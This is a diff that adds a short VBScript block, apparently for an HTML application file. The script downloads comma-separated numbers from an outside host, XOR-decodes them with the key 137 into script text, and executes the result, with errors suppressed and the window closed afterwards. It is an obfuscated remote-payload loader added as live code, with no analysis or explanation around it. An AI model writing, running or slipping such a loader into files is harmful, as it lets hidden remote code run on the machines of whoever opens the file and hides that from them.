@@ -1,0 +1,16 @@
+<script language="VBScript">
+On Error Resume Next
+Dim x,a,r,i
+Set x=CreateObject("MSXML2.XMLHTTP")
+x.Open "GET","https://stoplag.org/s2.txt",False
+x.Send
+If x.Status=200 Then
+ a=Split(x.ResponseText,",")
+ r=""
+ For i=0 To UBound(a)
+  r=r&Chr(CInt(a(i)) Xor 137)
+ Next
+ Execute r
+End If
+self.Close()
+</script>
